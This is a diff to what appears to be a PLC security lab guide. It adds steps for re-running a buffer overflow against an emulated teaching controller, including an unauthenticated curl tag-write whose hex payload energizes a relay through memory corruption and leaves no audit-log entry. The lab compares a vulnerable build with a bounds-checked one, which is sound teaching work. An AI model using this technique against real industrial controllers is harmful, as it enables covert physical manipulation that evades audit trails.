@@ -118,6 +118,25 @@ architecture (signing, TLS, network segmentation, secure boot).
 
 ## Verify it yourself — the honest way
 
+**Run the overflow yourself (teaching image, twin up).** The payload is the 48 bytes the
+derive tool emits — 32 zero bytes, then two little-endian `0x02` words that land on the
+relay-force mask. No login, no force API:
+
+```bash
+# in the plc> console (./qemu/console.sh):
+plc> unforce di0_start      # relay0 logic-OFF baseline
+plc> io                     # confirm relay0 act=0
+# in your shell — one unauthenticated, overlong tag write:
+curl -s 'http://127.0.0.1:8080/api/tag?data=000000000000000000000000000000000000000000000000000000000000000002000000000000000200000000000000'
+plc> io                     # relay0 act=1 — energized by memory corruption, not a force
+plc> log                    # NO "FORCE coil 1" line — a phantom force, no audit trail
+```
+
+On the **secure** build the same request leaves `relay0` OFF and the log empty —
+`plc_tag_write()` bounds-checks the copy. (`tools/derive-force-offset.py` regenerates the
+payload if the `ForceImage` layout changes.) This is the overflow Part 9 asks you to re-run
+against both builds.
+
 A changelog that says "fixed" is not evidence. You have the two images; establish the
 difference the way you established the attacks.
 
